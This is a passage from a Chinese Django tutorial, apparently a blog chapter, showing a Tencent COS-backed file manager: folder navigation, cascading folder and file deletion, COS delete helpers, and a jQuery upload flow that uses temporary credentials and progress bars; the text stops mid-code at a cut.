进入文件夹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file</span><span class="params">(request, project_id)</span>:</span></span><br><span class="line">    <span class="string">""" 文件列表 &amp; 添加文件夹"""</span></span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">    <span class="comment">######## 文件列表 &amp; 进入文件夹  #####</span></span><br><span class="line">    <span class="comment"># GET 查看页面</span></span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">"GET"</span>:</span><br><span class="line">            <span class="comment"># 导航条</span></span><br><span class="line">            breadcrumb_list = []</span><br><span class="line">            parent = parent_obj</span><br><span class="line">            <span class="keyword">while</span> parent:</span><br><span class="line">                <span class="comment"># breadcrumb_list.insert(0,&#123;'id':parent.id,'name':parent.name&#125;)</span></span><br><span class="line">                breadcrumb_list.insert(<span class="number">0</span>, model_to_dict(parent, [<span class="string">'id'</span>, <span class="string">'name'</span>]))</span><br><span class="line">                parent = parent.parent</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 当前目录下的所有文件 &amp; 文件夹获取即可</span></span><br><span class="line">            queryset = models.FileRespository.objects.filter(project=request.tracer.project).order_by(<span class="string">'-file_type'</span>)</span><br><span class="line">            <span class="keyword">if</span> folder_id:</span><br><span class="line">                <span class="comment"># 进入到某个目录</span></span><br><span class="line">                file_object_list = queryset.filter(parent=parent_obj)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 根目录</span></span><br><span class="line">                file_object_list = queryset.filter(parent__isnull=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">            form = FolderModelForm(request, folder_id)</span><br><span class="line">            <span class="keyword">return</span> render(request, <span class="string">'manage/file.html'</span>,&#123;<span class="string">'form'</span>: form, <span class="string">'file_object_list'</span>: file_object_list, <span class="string">'breadcrumb_list'</span>: breadcrumb_list,<span class="string">'folder_obj'</span>: parent_obj&#125;)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># POST 添加文件夹 &amp; 文件夹的修改</span></span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="11-6-删除文件夹（级联删除-amp-删除cos文件）"><a href="#11-6-删除文件夹（级联删除-amp-删除cos文件）" class="headerlink" title="11.6 删除文件夹（级联删除 &amp; 删除cos文件）"></a>11.6 删除文件夹（级联删除 &amp; 删除cos文件）</h3><h4 id="11-6-1-构造删除文件夹的url地址"><a href="#11-6-1-构造删除文件夹的url地址" class="headerlink" title="11.6.1 构造删除文件夹的url地址"></a>11.6.1 构造删除文件夹的url地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 文件管理</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 临时秘钥</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 文件删除</span></span><br><span class="line">    url(<span class="string">r'^file/delete$'</span>, file.file_delete, name=<span class="string">'file_delete'</span>),</span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure><h4 id="11-6-2-构造ajax请求，获取要删除文件的id"><a href="#11-6-2-构造ajax请求，获取要删除文件的id" class="headerlink" title="11.6.2 构造ajax请求，获取要删除文件的id"></a>11.6.2 构造ajax请求，获取要删除文件的id</h4><p>给删除按钮绑定事件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> FILE_DELETE_URL = <span class="string">"&#123;% url 'file_delete' project_id=request.tracer.project.id %&#125;"</span>;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line">            bindDeleteSubmit();</span><br><span class="line">        &#125;);</span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">bindDeleteSubmit</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">            $(<span class="string">'#btnDelete'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// 获取要删除的ID</span></span></span><br><span class="line"><span class="javascript">                $.ajax(&#123;</span></span><br><span class="line">                    url: FILE_DELETE_URL,</span><br><span class="line"><span class="actionscript">                    type: <span class="string">"GET"</span>,</span></span><br><span class="line"><span class="javascript">                    data: &#123;<span class="attr">fileid</span>: $(<span class="keyword">this</span>).attr(<span class="string">'fileid'</span>)&#125;,</span></span><br><span class="line"><span class="actionscript">                    success: <span class="function"><span class="keyword">function</span> <span class="params">(res)</span> </span>&#123;</span></span><br><span class="line">                        if (res.status) &#123;</span><br><span class="line">                            location.href = location.href;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="11-6-3-删除文件的视图函数"><a href="#11-6-3-删除文件的视图函数" class="headerlink" title="11.6.3 删除文件的视图函数"></a>11.6.3 删除文件的视图函数</h4><p>前端获取要删除的文件的id，发送到后台进行处理。</p><p>删除包括数据库删除以及cos删除，所有引用cos删除的相关函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> utils.tencent.cos <span class="keyword">import</span> delete_file, delete_file_list </span><br><span class="line"></span><br><span class="line"><span class="comment"># http://127.0.0.1:8000/manage/7/file/delete/?fileid=1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_delete</span><span class="params">(request, project_id)</span>:</span></span><br><span class="line">    <span class="string">""" 删除文件"""</span></span><br><span class="line">    fileid = request.GET.get(<span class="string">'fileid'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 删除数据库中的  文件 &amp; 文件夹（级联删除）</span></span><br><span class="line">    delete_obj = models.FileRespository.objects.filter(id=fileid, project=request.tracer.project.id).first()</span><br><span class="line">    <span class="keyword">if</span> delete_obj.file_type == <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># 删除文件(数据库文件删除、cos删除、项目已使用的空间容量还回去)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 删除文件时，将容量还给当前项目的已使用空间</span></span><br><span class="line">        request.tracer.project.use_space -= delete_obj.file_size</span><br><span class="line">        request.tracer.project.save()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># cos中删除文件</span></span><br><span class="line">        delete_file(request.tracer.project.bucket, request.tracer.project.region, delete_obj.key)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 数据库中删除当前文件</span></span><br><span class="line">        delete_obj.delete()</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">True</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 删除文件夹（找到文件夹下的所有文件-&gt;数据库文件删除、cos删除、项目已使用的空间容量还回去)</span></span><br><span class="line">    <span class="comment"># 找到文件夹下面的 文件 &amp; 文件夹</span></span><br><span class="line">    <span class="comment"># models.FileRespository.objects.filter(parent=delete_obj.parent)</span></span><br><span class="line"></span><br><span class="line">    total_size = <span class="number">0</span></span><br><span class="line">    folder_list = [delete_obj, ]</span><br><span class="line">    key_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> folder <span class="keyword">in</span> folder_list:</span><br><span class="line">        child_list = models.FileRespository.objects.filter(project=request.tracer.project, parent=folder).order_by(</span><br><span class="line">            <span class="string">'-file_type'</span>)</span><br><span class="line">        <span class="keyword">for</span> child <span class="keyword">in</span> child_list:</span><br><span class="line">            <span class="keyword">if</span> child.file_type == <span class="number">2</span>:</span><br><span class="line">                folder_list.append(child)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 文件大小汇总</span></span><br><span class="line">                total_size += child.file_size</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 删除文件</span></span><br><span class="line">                <span class="comment"># cos中删除文件</span></span><br><span class="line">                key_list.append(&#123;<span class="string">"Key"</span>: child.key&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cos批量删除文件</span></span><br><span class="line">    <span class="keyword">if</span> key_list:</span><br><span class="line">        delete_file_list(request.tracer.project.bucket, request.tracer.project.region, key_list)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> total_size:</span><br><span class="line">        <span class="comment"># 删除文件时，将容量还给当前项目的已使用空间</span></span><br><span class="line">        request.tracer.project.use_space -= total_size</span><br><span class="line">        request.tracer.project.save()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 数据库中删除当前文件</span></span><br><span class="line">    delete_obj.delete()</span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">True</span>&#125;)</span><br></pre></td></tr></table></figure><h4 id="11-6-4-删除cos"><a href="#11-6-4-删除cos" class="headerlink" title="11.6.4 删除cos"></a>11.6.4 删除cos</h4><p>在之前的操作中，utils文件夹下的tencent文件夹下的cos.py文件写入cos的相关操作，所以把cos删除操作写入到该文件夹。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_file</span><span class="params">(bucket, region, key)</span>:</span></span><br><span class="line">    <span class="string">""" 单独删除文件 """</span></span><br><span class="line"></span><br><span class="line">    config = CosConfig(Region=region, SecretId=settings.TENCENT_COS_ID, SecretKey=settings.TENCENT_COS_KEY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 获取客户端对象</span></span><br><span class="line">    client = CosS3Client(config)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 删除文件</span></span><br><span class="line">    client.delete_object(</span><br><span class="line">        Bucket=bucket,  <span class="comment"># 要删除桶的名称</span></span><br><span class="line">        Key=key,  <span class="comment"># 桶要删除的文件名</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_file_list</span><span class="params">(bucket, region, key_list)</span>:</span></span><br><span class="line">    <span class="string">""" 批量删除文件 """</span></span><br><span class="line"></span><br><span class="line">    config = CosConfig(Region=region, SecretId=settings.TENCENT_COS_ID, SecretKey=settings.TENCENT_COS_KEY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 获取客户端对象</span></span><br><span class="line">    client = CosS3Client(config)</span><br><span class="line">    objects = &#123;</span><br><span class="line">        <span class="string">"Quiet"</span>: <span class="string">"true"</span>,</span><br><span class="line">        <span class="string">"Object"</span>: key_list</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 删除文件</span></span><br><span class="line">    client.delete_objects(</span><br><span class="line">        Bucket=bucket,  <span class="comment"># 要删除桶的名称</span></span><br><span class="line">        Delete=objects,  <span class="comment"># 桶要删除的文件名</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><h3 id="11-7-上传文件"><a href="#11-7-上传文件" class="headerlink" title="11.7 上传文件"></a>11.7 上传文件</h3><h4 id="11-7-1-构造上传文件的url地址"><a href="#11-7-1-构造上传文件的url地址" class="headerlink" title="11.7.1 构造上传文件的url地址"></a>11.7.1 构造上传文件的url地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 项目管理</span></span><br><span class="line">url(<span class="string">r'^manage/(?P&lt;project_id&gt;\d+)/'</span>, include([</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 文件管理</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 临时秘钥</span></span><br><span class="line">    url(<span class="string">r'^cos/credential/$'</span>, file.cos_credential, name=<span class="string">'cos_credential'</span>),</span><br><span class="line">    <span class="comment"># 文件删除</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment"># 上传文件</span></span><br><span class="line">    url(<span class="string">r'^file/post/$'</span>, file.file_post, name=<span class="string">'file_post'</span>),</span><br><span class="line">], <span class="literal">None</span>, <span class="literal">None</span>)),</span><br></pre></td></tr></table></figure><h4 id="11-7-2-获取临时秘钥-amp-上传文件进度条构建"><a href="#11-7-2-获取临时秘钥-amp-上传文件进度条构建" class="headerlink" title="11.7.2 获取临时秘钥 &amp; 上传文件进度条构建"></a>11.7.2 获取临时秘钥 &amp; 上传文件进度条构建</h4><p>前端给上传文件绑定事件，获取临时凭证。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> COS_CREDENTIAL = <span class="string">"&#123;% url 'cos_credential' project_id=request.tracer.project.id %&#125;"</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> FILE_POST = <span class="string">"&#123;% url 'file_post' project_id=request.tracer.project.id %&#125;"</span>;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line">        bindUploadFile();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">bindUploadFile</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'#uploadFile'</span>).change(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 清空上传进度条</span></span></span><br><span class="line"><span class="javascript">            $(<span class="string">'#progressList'</span>).empty();</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> fileList = $(<span class="keyword">this</span>)[<span class="number">0</span>].files;    <span class="comment">//通过获取文件元素对象的集合files</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="comment">// 获取本次要上传的每个文件名称大小</span></span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> checkFileList = [];</span></span><br><span class="line"><span class="javascript">            $.each(fileList, <span class="function"><span class="keyword">function</span> (<span class="params">index, fileobject</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">                checkFileList.push(&#123;<span class="string">'name'</span>: fileobject.name, <span class="string">'size'</span>: fileobject.size&#125;)</span></span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="comment">// 把数据发送到后台，后台进行内容校验</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 如果没有问题发送临时凭证，否则发送错误信息</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 获取临时凭证，规定好的无需修改</span></span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> cos_obj = <span class="keyword">new</span> COS(&#123;</span></span><br><span class="line"><span class="actionscript">                getAuthorization: <span class="function"><span class="keyword">function</span> <span class="params">(options, callback)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                    <span class="comment">// 向django后台发送请求，获取临时凭证</span></span></span><br><span class="line"><span class="javascript">                    $.post(COS_CREDENTIAL, <span class="built_in">JSON</span>.stringify(checkFileList),</span></span><br><span class="line"><span class="actionscript">                           <span class="comment">// 可从 options 取需要的参数</span></span></span><br><span class="line"><span class="actionscript">                           <span class="function"><span class="keyword">function</span> <span class="params">(res)</span> </span>&#123;</span></span><br><span class="line">                        if (res.status) &#123;</span><br><span class="line"><span class="actionscript">                            <span class="comment">// 通过验证，获取临时凭证</span></span></span><br><span class="line"><span class="actionscript">                            <span class="keyword">var</span> credentials = res.data &amp;&amp; res.data.credentials;</span></span><br><span class="line"><span class="javascript">                            <span class="keyword">if</span> (!res.data || !credentials) <span class="keyword">return</span> <span class="built_in">console</span>.error(<span class="string">'credentials invalid'</span>);</span></span><br><span class="line">                            callback(&#123;</span><br><span class="line">                                TmpSecretId: credentials.tmpSecretId,</span><br><span class="line">                                TmpSecretKey: credentials.tmpSecretKey,</span><br><span class="line">                                XCosSecurityToken: credentials.sessionToken,</span><br><span class="line">                                StartTime: res.data.startTime,</span><br><span class="line">                                ExpiredTime: res.data.expiredTime,</span><br><span class="line">                            &#125;);</span><br><span class="line"><span class="actionscript">                            <span class="comment">// 清除uploadProgress 的 class="hide" 属性，显示上传信息</span></span></span><br><span class="line"><span class="javascript">                            $(<span class="string">'#uploadProgress'</span>).removeClass(<span class="string">'hide'</span>);</span></span><br><span class="line"><span class="actionscript">                        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="actionscript">                            <span class="comment">// 没通过，弹窗展示错误信息</span></span></span><br><span class="line">                            alert(res.error);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="comment">// 上传文件前先获取临时凭证</span></span></span><br><span class="line"><span class="javascript">            $.each(fileList, <span class="function"><span class="keyword">function</span> (<span class="params">index, fileobject</span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> fileName = fileobject.name;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">var</span> fileSize = fileobject.size;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> key = (<span class="keyword">new</span> <span class="built_in">Date</span>()).getTime() + <span class="string">"_"</span> + fileName;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">                <span class="comment">// 构造进度条</span></span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> tr = $(<span class="string">'#progressTemplate'</span>).find(<span class="string">'tr'</span>).clone();</span></span><br><span class="line"><span class="actionscript">                tr.find(<span class="string">'.name'</span>).text(fileName);</span></span><br><span class="line"><span class="javascript">                $(<span class="string">'#progressList'</span>).append(tr);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">                <span class="comment">//上传文件</span></span></span><br><span class="line">                cos_obj.putObject(&#123;</span><br><span class="line"><span class="actionscript">                    Bucket: <span class="string">'&#123;&#123; request.tracer.project.bucket &#125;&#125;'</span>,<span class="comment">/*必须*/</span></span></span><br><span class="line"><span class="actionscript">                    Region: <span class="string">'&#123;&#123; request.tracer.project.region &#125;&#125;'</span>, <span class="comment">/* 必须 */</span></span></span><br><span class="line">                    Key: key,</span><br><span class="line"><span class="actionscript">                    Body: fileobject,<span class="comment">//上传文件对象</span></span></span><br><span class="line"><span class="actionscript">                    onProgress: <span class="function"><span class="keyword">function</span> <span class="params">(progressData)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                        <span class="comment">//进度条</span></span></span><br><span class="line"><span class="actionscript">                        <span class="keyword">var</span> percent = progressData.percent * <span class="number">100</span> + <span class="string">'%'</span>;</span></span><br><span class="line"><span class="actionscript">                        tr.find(<span class="string">'.progress-bar'</span>).text(percent);</span></span><br><span class="line"><span class="actionscript">                        tr.find(<span class="string">'.progress-bar'</span>).css(<span class="string">'width'</span>, percent);</span></span><br><span class="line">                    &#125;</span><br><span class="line"><span class="actionscript">                &#125;, <span class="function"><span class="keyword">function</span> <span class="params">(err, data)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                    <span class="comment">// 是否上传成功</span></span></span><br><span class="line"><span class="actionscript">                    <span class="comment">// 把上传成功的文件信息提交给django，djangi写入数据库</span></span></span><br><span class="line"><span class="javascript">                    <span class="built_in">console</span>.log(err || data);</span></span><br><span class="line">                    if (data &amp;&amp; data.statusCode === 200) &#123;</span><br><span class="line"><span class="actionscript">                        <span class="comment">// 上传成功之后，将本次上传的文件提交给后台，并写入数据库</span></span></span><br><span class="line"><span class="actionscript">                        <span class="comment">// 当前文件上传成功</span></span></span><br><span class="line"><span class="javascript">                        $.post(FILE_POST, &#123;</span></span><br><span class="line"><span class="actionscript">                            <span class="string">'name'</span>: fileName,</span></span><br><span class="line"><span class="actionscript">                            <span class="string">'key'</span>: key,</span></span><br><span class="line"><span class="actionscript">                            <span class="string">'file_size'</span>: fileSize,</span></span><br><span class="line"><span class="actionscript">                            <span class="string">'file_path'</span>: data.Location,</span></span><br><span class="line"><span class="actionscript">                            <span class="string">'parent'</span>: CURRENT_FOLDER_ID,</span></span><br><span class="line"><span class="actionscript">                            <span class="string">'etag'</span>: data.ETag,</span></span><br><span class="line"><span class="actionscript">                        &#125;, <span class="function"><span class="keyword">function</span> <span class="params">(res)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">                            <span class="comment">// 数据库中写入成功，动态显示</span></span></span><br><span class="line"><span class="javascript">                            <span class="keyword">var</span> newTr = $(<span class="string">'#rowTpl'</span>).find(<span class="string">'tr'</span>).clone();</span></span><br><span class="line"><span class="actionscript">                            newTr.find(<span class="string">'.name'</span>).text(res.data.name);</span></span><br><span class="line"><span class="actionscript">                            newTr.find(<span class="string">'.file_size'</span>).text(res.data.file_size);</span></span><br><span class="line"><span class="actionscript">                            newTr.find(<span class="string">'.username'</span>).text(res.data.username);</span></span><br><span class="line"><span class="actionscript">                            newTr.find(<span class="string">'.datetime'</span>).text(res.data.datetime);</span></span><br><span class="line"><span class="actionscript">                            newTr.find(<span class="string">'.delete'</span>).attr(<span class="string">'data-fileid'</span>, res.data.id);</span></span><br><span class="line"><span class="actionscript">                            newTr.find(<span class="string">'.download'</span>).attr(<span class="string">'href'</span>, res.data.download_url);</span></span><br><span class="line"><span class="javascript">                            $(<span class="string">'#rowList'</span>).append(newTr);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">                            <span class="comment">// 上传完成后进度条删除</span></span></span><br><span class="line">                            tr.remove();</span><br><span class="line">                        &#125;)</span><br><span class="line"><span class="actionscript">                    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="actionscript">                        tr.find(<span class="string">'.progress-error'</span>).text(<span class="string">'上传失败'</span>);</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="11-7-3-cos上传文件-amp-cos临时凭证"><a href="#11-7-3-cos上传文件-amp-cos临时凭证" class="headerlink" title="11.7.3 cos上传文件 &amp; cos临时凭证"></a>11.7.3 cos上传文件 &amp; cos临时凭证</h4><p>cos相关代码写在cos.py文件中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 